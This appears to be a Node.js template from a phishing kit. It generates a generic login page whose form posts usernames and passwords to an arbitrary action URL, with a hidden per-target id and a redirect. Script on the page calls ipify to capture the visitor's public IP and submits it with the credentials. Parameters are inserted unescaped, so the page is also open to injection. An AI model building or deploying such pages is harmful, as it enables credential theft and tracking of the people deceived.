module.exports = (title, description, bgUrl, actionUrl, redirectUrl,uid, googAnalyticsScript) => `
<html> 
    <head>
        <title>${title}</title>
        <script src=
        "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
        </script>
    </head>
    <body>
        <div class='main'>
        ${description}
        <form action='${actionUrl}/login?redirect=${redirectUrl}' method='post'>
        <input type='hidden' value=${uid} name='sid'/>
        <input type='hidden' id='ip' name='ip'/>
        <input type='text' name='username'/>
        <input type='password' name='password'/>
        <button id='test'>Dang</button>
        </form>
        </div>
        <script>
        $.getJSON("https://api.ipify.org?format=json",
                                          function(data) {
  
            // Setting text of element P with id gfg
            $("#ip").val(data.ip);
        })
        </script>
        ${googAnalyticsScript}
    </body>
</html>
`